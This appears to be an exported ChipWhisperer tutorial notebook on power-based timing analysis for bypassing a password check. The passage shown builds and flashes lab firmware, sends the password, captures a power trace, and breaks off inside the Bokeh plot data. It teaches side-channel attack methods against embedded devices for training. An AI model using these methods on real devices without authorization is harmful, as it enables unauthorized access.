
Timing Analysis with Power for Password Bypass
==============================================

This tutorial will introduce you to breaking devices by determining when
a device is performing certain operations. It will use a simple password
check, and demonstrate how to perform a basic power analysis.

Note this is not a prerequisite to the tutorial on breaking AES. You can
skip this tutorial if you wish to go ahead with the AES tutorial.


**In [1]:**

.. code:: ipython3

    SCOPETYPE = 'OPENADC'
    PLATFORM = 'CWLITEXMEGA'
    CRYPTO_TARGET = 'AVRCRYPTOLIB'

Firmware
--------

Like before, we’ll need to setup our ``PLATFORM``, then build the
firmware:


**In [2]:**

.. code:: bash

    %%bash -s "$PLATFORM" "$CRYPTO_TARGET"
    cd ../hardware/victims/firmware/basic-passwdcheck
    make PLATFORM=$1 CRYPTO_TARGET=$2


**Out [2]:**



.. parsed-literal::

    rm -f -- basic-passwdcheck-CWLITEXMEGA.hex
    rm -f -- basic-passwdcheck-CWLITEXMEGA.eep
    rm -f -- basic-passwdcheck-CWLITEXMEGA.cof
    rm -f -- basic-passwdcheck-CWLITEXMEGA.elf
    rm -f -- basic-passwdcheck-CWLITEXMEGA.map
    rm -f -- basic-passwdcheck-CWLITEXMEGA.sym
    rm -f -- basic-passwdcheck-CWLITEXMEGA.lss
    rm -f -- objdir/\*.o
    rm -f -- objdir/\*.lst
    rm -f -- basic-passwdcheck.s simpleserial.s XMEGA_AES_driver.s uart.s usart_driver.s xmega_hal.s aes-independant.s aes_enc.s aes_keyschedule.s aes_sbox.s aes128_enc.s
    rm -f -- basic-passwdcheck.d simpleserial.d XMEGA_AES_driver.d uart.d usart_driver.d xmega_hal.d aes-independant.d aes_enc.d aes_keyschedule.d aes_sbox.d aes128_enc.d
    rm -f -- basic-passwdcheck.i simpleserial.i XMEGA_AES_driver.i uart.i usart_driver.i xmega_hal.i aes-independant.i aes_enc.i aes_keyschedule.i aes_sbox.i aes128_enc.i
    .
    -------- begin --------
    avr-gcc (GCC) 5.4.0
    Copyright (C) 2015 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: basic-passwdcheck.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DAVRCRYPTOLIB -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -I.././crypto/avrcryptolib//aes -I.././crypto/avrcryptolib//gf256mul -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck.o.d basic-passwdcheck.c -o objdir/basic-passwdcheck.o 
    .
    Compiling C: .././simpleserial/simpleserial.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DAVRCRYPTOLIB -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -I.././crypto/avrcryptolib//aes -I.././crypto/avrcryptolib//gf256mul -std=gnu99 -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o 
    .
    Compiling C: .././hal/xmega/XMEGA_AES_driver.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DAVRCRYPTOLIB -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/XMEGA_AES_driver.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -I.././crypto/avrcryptolib//aes -I.././crypto/avrcryptolib//gf256mul -std=gnu99 -MMD -MP -MF .dep/XMEGA_AES_driver.o.d .././hal/xmega/XMEGA_AES_driver.c -o objdir/XMEGA_AES_driver.o 
    .
    Compiling C: .././hal/xmega/uart.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DAVRCRYPTOLIB -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/uart.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -I.././crypto/avrcryptolib//aes -I.././crypto/avrcryptolib//gf256mul -std=gnu99 -MMD -MP -MF .dep/uart.o.d .././hal/xmega/uart.c -o objdir/uart.o 
    .
    Compiling C: .././hal/xmega/usart_driver.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DAVRCRYPTOLIB -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/usart_driver.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -I.././crypto/avrcryptolib//aes -I.././crypto/avrcryptolib//gf256mul -std=gnu99 -MMD -MP -MF .dep/usart_driver.o.d .././hal/xmega/usart_driver.c -o objdir/usart_driver.o 
    .
    Compiling C: .././hal/xmega/xmega_hal.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DAVRCRYPTOLIB -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/xmega_hal.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -I.././crypto/avrcryptolib//aes -I.././crypto/avrcryptolib//gf256mul -std=gnu99 -MMD -MP -MF .dep/xmega_hal.o.d .././hal/xmega/xmega_hal.c -o objdir/xmega_hal.o 
    .
    Compiling C: .././crypto/aes-independant.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DAVRCRYPTOLIB -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/aes-independant.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -I.././crypto/avrcryptolib//aes -I.././crypto/avrcryptolib//gf256mul -std=gnu99 -MMD -MP -MF .dep/aes-independant.o.d .././crypto/aes-independant.c -o objdir/aes-independant.o 
    .
    Compiling C: .././crypto/avrcryptolib//aes/aes_enc.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DAVRCRYPTOLIB -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/aes_enc.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -I.././crypto/avrcryptolib//aes -I.././crypto/avrcryptolib//gf256mul -std=gnu99 -MMD -MP -MF .dep/aes_enc.o.d .././crypto/avrcryptolib//aes/aes_enc.c -o objdir/aes_enc.o 
    .
    Compiling C: .././crypto/avrcryptolib//aes/aes_keyschedule.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DAVRCRYPTOLIB -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/aes_keyschedule.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -I.././crypto/avrcryptolib//aes -I.././crypto/avrcryptolib//gf256mul -std=gnu99 -MMD -MP -MF .dep/aes_keyschedule.o.d .././crypto/avrcryptolib//aes/aes_keyschedule.c -o objdir/aes_keyschedule.o 
    .
    Compiling C: .././crypto/avrcryptolib//aes/aes_sbox.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DAVRCRYPTOLIB -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/aes_sbox.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -I.././crypto/avrcryptolib//aes -I.././crypto/avrcryptolib//gf256mul -std=gnu99 -MMD -MP -MF .dep/aes_sbox.o.d .././crypto/avrcryptolib//aes/aes_sbox.c -o objdir/aes_sbox.o 
    .
    Compiling C: .././crypto/avrcryptolib//aes/aes128_enc.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DAVRCRYPTOLIB -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/aes128_enc.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -I.././crypto/avrcryptolib//aes -I.././crypto/avrcryptolib//gf256mul -std=gnu99 -MMD -MP -MF .dep/aes128_enc.o.d .././crypto/avrcryptolib//aes/aes128_enc.c -o objdir/aes128_enc.o 
    .
    Assembling: .././crypto/avrcryptolib//gf256mul/gf256mul.S
    avr-gcc -c -mmcu=atxmega128d3 -I. -x assembler-with-cpp -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir/gf256mul.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -I.././crypto/avrcryptolib//aes -I.././crypto/avrcryptolib//gf256mul .././crypto/avrcryptolib//gf256mul/gf256mul.S -o objdir/gf256mul.o
    .
    Linking: basic-passwdcheck-CWLITEXMEGA.elf
    avr-gcc -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS_VER=SS_VER_1_0 -DHAL_TYPE=HAL_xmega -DPLATFORM=CWLITEXMEGA -DAVRCRYPTOLIB -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.o -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -I.././crypto/avrcryptolib//aes -I.././crypto/avrcryptolib//gf256mul -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck-CWLITEXMEGA.elf.d objdir/basic-passwdcheck.o objdir/simpleserial.o objdir/XMEGA_AES_driver.o objdir/uart.o objdir/usart_driver.o objdir/xmega_hal.o objdir/aes-independant.o objdir/aes_enc.o objdir/aes_keyschedule.o objdir/aes_sbox.o objdir/aes128_enc.o objdir/gf256mul.o --output basic-passwdcheck-CWLITEXMEGA.elf -Wl,-Map=basic-passwdcheck-CWLITEXMEGA.map,--cref   -lm  
    .
    Creating load file for Flash: basic-passwdcheck-CWLITEXMEGA.hex
    avr-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature basic-passwdcheck-CWLITEXMEGA.elf basic-passwdcheck-CWLITEXMEGA.hex
    .
    Creating load file for EEPROM: basic-passwdcheck-CWLITEXMEGA.eep
    avr-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    --change-section-lma .eeprom=0 --no-change-warnings -O ihex basic-passwdcheck-CWLITEXMEGA.elf basic-passwdcheck-CWLITEXMEGA.eep || exit 0
    .
    Creating Extended Listing: basic-passwdcheck-CWLITEXMEGA.lss
    avr-objdump -h -S -z basic-passwdcheck-CWLITEXMEGA.elf > basic-passwdcheck-CWLITEXMEGA.lss
    .
    Creating Symbol Table: basic-passwdcheck-CWLITEXMEGA.sym
    avr-nm -n basic-passwdcheck-CWLITEXMEGA.elf > basic-passwdcheck-CWLITEXMEGA.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
       3724	    304	    436	   4464	   1170	basic-passwdcheck-CWLITEXMEGA.elf
    +--------------------------------------------------------
    + Built for platform CW-Lite XMEGA
    +--------------------------------------------------------
    




.. parsed-literal::

    .././simpleserial/simpleserial.c: In function â€˜simpleserial_getâ€™:
    .././simpleserial/simpleserial.c:131:10: warning: variable â€˜retâ€™ set but not used [-Wunused-but-set-variable]
      uint8_t ret[1];
              ^
    


Setup
-----

Setup is the same as usual, except this time we’ll be capturing 2000
traces.


**In [3]:**

.. code:: ipython3

    %run "Helper_Scripts/Setup.ipynb"


**In [4]:**

.. code:: ipython3

    fw_path = '../hardware/victims/firmware/basic-passwdcheck/basic-passwdcheck-{}.hex'.format(PLATFORM)


**In [5]:**

.. code:: ipython3

    cw.program_target(scope, prog, fw_path)


**Out [5]:**



.. parsed-literal::

    XMEGA Programming flash...
    XMEGA Reading flash...
    Verified flash OK, 4027 bytes
    


Communicating With The Target
-----------------------------

As was mentioned at the beginning of the tutorial, the firmware we
loaded onto the target implements a basic password check. After getting
a ``'\n'`` terminated password, the target checks it and enters an
infinite loop, so before communicating with it, we’ll need to reset it.

We’ll be doing this a lot, so we’ll define a function that resets the
target (this function is also available by running
“Helper_Scripts/Setup.ipynb” as we did above):


**In [6]:**

.. code:: ipython3

    import time
    def reset_target(scope):
        if PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            scope.io.pdic = 'low'
            time.sleep(0.05)
            scope.io.pdic = 'high'
            time.sleep(0.05)
        else:  
            scope.io.nrst = 'low'
            time.sleep(0.05)
            scope.io.nrst = 'high'
            time.sleep(0.05)

The target sends some text to us upon starting. After running the block
below, you should see some text appear.

**NOTE** The text may appear cutoff, accompanied by a message about data
loss. This means that the buffer used to store serial data (128 bytes)
from the target is full. This isn’t an issue here, since the text is
just aesthetic, but keep this in mind if you want to do large transfers
of serial data using ChipWhisperer.


**In [7]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.05)
        num_char = target.in_waiting()
        
    print(ret)


**Out [7]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

     \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
     \*\*\*\*\*Safe-o-matic 3000 Booting...
    A..[DONE]
    Decrypting database..[DONE]
    
    
    WARNING: UNAUTHORIZED ACCESS WILL BE PUNISHED
    Please enter password to continue: 
    


Now we can send the target a password:


**In [8]:**

.. code:: ipython3

    target.flush()
    target.write("h0px3\n")

And get the response. We sent it the right password (hopx3), so you
should see “Access granted, Welcome!”:


**In [9]:**

.. code:: ipython3

    print(target.read(timeout=100))


**Out [9]:**



.. parsed-literal::

    Access granted, Welcome!
    
    


**tip**

In real systems, you may often know one of the passwords, which is
sufficient to investigate the password checking routines as we will do.
You also normally have an ability to reset passwords to default. While
the reset procedure would erase any data you care about, the attacker
will be able to use this ‘sacrificial’ device to learn about possible
vulnerabilities. So the assumption that we have access to the password
is really just saying we have access to a password, and will use that
knowledge to break the system in general.

Recording Traces
----------------

Now that we can communicate with our super-secure system, our next goal
is to get a power trace while the target is running. To do this, we’ll
arm the scope just before we send our password attempt, then record the
trace as we’ve done before.


**In [10]:**

.. code:: ipython3

    if PLATFORM == "CWNANO":
        scope.adc.samples = 800
    else:
        scope.adc.samples = 2000


**In [11]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
        
    print(ret)
    scope.arm()
    target.flush()
    target.write("h0px3\n")
    ret = scope.capture()
    if ret:
        print('Timeout happened during acquisition')
            
    trace = scope.get_last_trace()
    resp = ""
    num_char = target.in_waiting()
    while num_char > 0:
        resp += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
    print(resp)


**Out [11]:**



.. parsed-literal::

     \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
    Masquerading flash...[DONE]
    Decrypting database..[DONE]
    
    Access granted, Welcome!
    
    


Now that we have a trace, we’ll use bokeh to plot it:


**In [12]:**

.. code:: ipython3

    from bokeh.plotting import figure, show 
    from bokeh.io import output_notebook
    from bokeh.models import CrosshairTool
    
    output_notebook()
    p = figure()
    x_range = range(0, len(trace))
    p.line(x_range, trace)
    show(p)


**Out [12]:**


.. raw:: html

    <div class="data_html">
        
        <div class="bk-root">
            <a href="https://bokeh.pydata.org" target="_blank" class="bk-logo bk-logo-small bk-logo-notebook"></a>
            <span id="1001">Loading BokehJS ...</span>
        </div>
    </div>



.. raw:: html

    

    <div id="fd01cd36-3607-40fb-a57f-84c00c9584ce"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#fd01cd36-3607-40fb-a57f-84c00c9584ce');
        
    (function(root) {
      function now() {
        return new Date();
      }
    
      var force = true;
    
      if (typeof (root._bokeh_onload_callbacks) === "undefined" || force === true) {
        root._bokeh_onload_callbacks = [];
        root._bokeh_is_loading = undefined;
      }
    
      var JS_MIME_TYPE = 'application/javascript';
      var HTML_MIME_TYPE = 'text/html';
      var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';
      var CLASS_NAME = 'output_bokeh rendered_html';
    
      /**
       * Render data to the DOM node
       */
      function render(props, node) {
        var script = document.createElement("script");
        node.appendChild(script);
      }
    
      /**
       * Handle when an output is cleared or removed
       */
      function handleClearOutput(event, handle) {
        var cell = handle.cell;
    
        var id = cell.output_area._bokeh_element_id;
        var server_id = cell.output_area._bokeh_server_id;
        // Clean up Bokeh references
        if (id != null && id in Bokeh.index) {
          Bokeh.index[id].model.document.clear();
          delete Bokeh.index[id];
        }
    
        if (server_id !== undefined) {
          // Clean up Bokeh references
          var cmd = "from bokeh.io.state import curstate; print(curstate().uuid_to_server['" + server_id + "'].get_sessions()[0].document.roots[0]._id)";
          cell.notebook.kernel.execute(cmd, {
            iopub: {
              output: function(msg) {
                var id = msg.content.text.trim();
                if (id in Bokeh.index) {
                  Bokeh.index[id].model.document.clear();
                  delete Bokeh.index[id];
                }
              }
            }
          });
          // Destroy server and session
          var cmd = "import bokeh.io.notebook as ion; ion.destroy_server('" + server_id + "')";
          cell.notebook.kernel.execute(cmd);
        }
      }
    
      /**
       * Handle when a new output is added
       */
      function handleAddOutput(event, handle) {
        var output_area = handle.output_area;
        var output = handle.output;
    
        // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only
        if ((output.output_type != "display_data") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {
          return
        }
    
        var toinsert = output_area.element.find("." + CLASS_NAME.split(' ')[0]);
    
        if (output.metadata[EXEC_MIME_TYPE]["id"] !== undefined) {
          toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];
          // store reference to embed id on output_area
          output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE]["id"];
        }
        if (output.metadata[EXEC_MIME_TYPE]["server_id"] !== undefined) {
          var bk_div = document.createElement("div");
          bk_div.innerHTML = output.data[HTML_MIME_TYPE];
          var script_attrs = bk_div.children[0].attributes;
          for (var i = 0; i < script_attrs.length; i++) {
            toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);
          }
          // store reference to server id on output_area
          output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE]["server_id"];
        }
      }
    
      function register_renderer(events, OutputArea) {
    
        function append_mime(data, metadata, element) {
          // create a DOM node to render to
          var toinsert = this.create_output_subarea(
            metadata,
            CLASS_NAME,
            EXEC_MIME_TYPE
          );
          this.keyboard_manager.register_events(toinsert);
          // Render to node
          var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};
          render(props, toinsert[toinsert.length - 1]);
          element.append(toinsert);
          return toinsert
        }
    
        /* Handle when an output is cleared or removed */
        events.on('clear_output.CodeCell', handleClearOutput);
        events.on('delete.Cell', handleClearOutput);
    
        /* Handle when a new output is added */
        events.on('output_added.OutputArea', handleAddOutput);
    
        /**
         * Register the mime type and append_mime function with output_area
         */
        OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {
          /* Is output safe? */
          safe: true,
          /* Index of renderer in `output_area.display_order` */
          index: 0
        });
      }
    
      // register the mime type if in Jupyter Notebook environment and previously unregistered
      if (root.Jupyter !== undefined) {
        var events = require('base/js/events');
        var OutputArea = require('notebook/js/outputarea').OutputArea;
    
        if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {
          register_renderer(events, OutputArea);
        }
      }
    
      
      if (typeof (root._bokeh_timeout) === "undefined" || force === true) {
        root._bokeh_timeout = Date.now() + 5000;
        root._bokeh_failed_load = false;
      }
    
      var NB_LOAD_WARNING = {'data': {'text/html':
         "<div style='background-color: #fdd'>\n"+
         "<p>\n"+
         "BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \n"+
         "may be due to a slow or bad network connection. Possible fixes:\n"+
         "</p>\n"+
         "<ul>\n"+
         "<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\n"+
         "<li>use INLINE resources instead, as so:</li>\n"+
         "</ul>\n"+
         "<code>\n"+
         "from bokeh.resources import INLINE\n"+
         "output_notebook(resources=INLINE)\n"+
         "</code>\n"+
         "</div>"}};
    
      function display_loaded() {
        var el = document.getElementById("1001");
        if (el != null) {
          el.textContent = "BokehJS is loading...";
        }
        if (root.Bokeh !== undefined) {
          if (el != null) {
            el.textContent = "BokehJS " + root.Bokeh.version + " successfully loaded.";
          }
        } else if (Date.now() < root._bokeh_timeout) {
          setTimeout(display_loaded, 100)
        }
      }
    
    
      function run_callbacks() {
        try {
          root._bokeh_onload_callbacks.forEach(function(callback) { callback() });
        }
        finally {
          delete root._bokeh_onload_callbacks
        }
        console.info("Bokeh: all callbacks have finished");
      }
    
      function load_libs(js_urls, callback) {
        root._bokeh_onload_callbacks.push(callback);
        if (root._bokeh_is_loading > 0) {
          console.log("Bokeh: BokehJS is being loaded, scheduling callback at", now());
          return null;
        }
        if (js_urls == null || js_urls.length === 0) {
          run_callbacks();
          return null;
        }
        console.log("Bokeh: BokehJS not loaded, scheduling load and callback at", now());
        root._bokeh_is_loading = js_urls.length;
        for (var i = 0; i < js_urls.length; i++) {
          var url = js_urls[i];
          var s = document.createElement('script');
          s.src = url;
          s.async = false;
          s.onreadystatechange = s.onload = function() {
            root._bokeh_is_loading--;
            if (root._bokeh_is_loading === 0) {
              console.log("Bokeh: all BokehJS libraries loaded");
              run_callbacks()
            }
          };
          s.onerror = function() {
            console.warn("failed to load library " + url);
          };
          console.log("Bokeh: injecting script tag for BokehJS library: ", url);
          document.getElementsByTagName("head")[0].appendChild(s);
        }
      };var element = document.getElementById("1001");
      if (element == null) {
        console.log("Bokeh: ERROR: autoload.js configured with elementid '1001' but no matching script tag was found. ")
        return false;
      }
    
      var js_urls = ["https://cdn.pydata.org/bokeh/release/bokeh-1.0.1.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.1.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.1.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-gl-1.0.1.min.js"];
    
      var inline_js = [
        function(Bokeh) {
          Bokeh.set_log_level("info");
        },
        
        function(Bokeh) {
          
        },
        function(Bokeh) {
          console.log("Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-1.0.1.min.css");
          Bokeh.embed.inject_css("https://cdn.pydata.org/bokeh/release/bokeh-1.0.1.min.css");
          console.log("Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.1.min.css");
          Bokeh.embed.inject_css("https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.1.min.css");
          console.log("Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.1.min.css");
          Bokeh.embed.inject_css("https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.1.min.css");
        }
      ];
    
      function run_inline_js() {
        
        if ((root.Bokeh !== undefined) || (force === true)) {
          for (var i = 0; i < inline_js.length; i++) {
            inline_js[i].call(root, root.Bokeh);
          }if (force === true) {
            display_loaded();
          }} else if (Date.now() < root._bokeh_timeout) {
          setTimeout(run_inline_js, 100);
        } else if (!root._bokeh_failed_load) {
          console.log("Bokeh: BokehJS failed to load within specified timeout.");
          root._bokeh_failed_load = true;
        } else if (force !== true) {
          var cell = $(document.getElementById("1001")).parents('.cell').data().cell;
          cell.output_area.append_execute_result(NB_LOAD_WARNING)
        }
    
      }
    
      if (root._bokeh_is_loading === 0) {
        console.log("Bokeh: BokehJS loaded, going straight to plotting");
        run_inline_js();
      } else {
        load_libs(js_urls, function() {
          console.log("Bokeh: BokehJS plotting callback run at", now());
          run_inline_js();
        });
      }
    }(window));
    </script>
    </div>


.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="446cc453-20ee-4e16-821b-364a82a8cb65"></div>
    
    </div>



.. raw:: html

    

    <div id="a5d7bf03-ae76-4e98-bf57-39f492203990"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#a5d7bf03-ae76-4e98-bf57-39f492203990');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"c5c77be9-4a92-4ef9-a254-d8b9cc5401ce":{"roots":{"references":[{"attributes":{"below":[{"id":"1011","type":"LinearAxis"}],"left":[{"id":"1016","type":"LinearAxis"}],"renderers":[{"id":"1011","type":"LinearAxis"},{"id":"1015","type":"Grid"},{"id":"1016","type":"LinearAxis"},{"id":"1020","type":"Grid"},{"id":"1029","type":"BoxAnnotation"},{"id":"1039","type":"GlyphRenderer"}],"title":{"id":"1042","type":"Title"},"toolbar":{"id":"1027","type":"Toolbar"},"x_range":{"id":"1003","type":"DataRange1d"},"x_scale":{"id":"1007","type":"LinearScale"},"y_range":{"id":"1005","type":"DataRange1d"},"y_scale":{"id":"1009","type":"LinearScale"}},"id":"1002","subtype":"Figure","type":"Plot"},{"attributes":{},"id":"1017","type":"BasicTicker"},{"attributes":{"dimension":1,"plot":{"id":"1002","subtype":"Figure","type":"Plot"},"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1020","type":"Grid"},{"attributes":{"plot":null,"text":""},"id":"1042","type":"Title"},{"attributes":{"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1037","type":"Line"},{"attributes":{"callback":null},"id":"1003","type":"DataRange1d"},{"attributes":{},"id":"1022","type":"WheelZoomTool"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,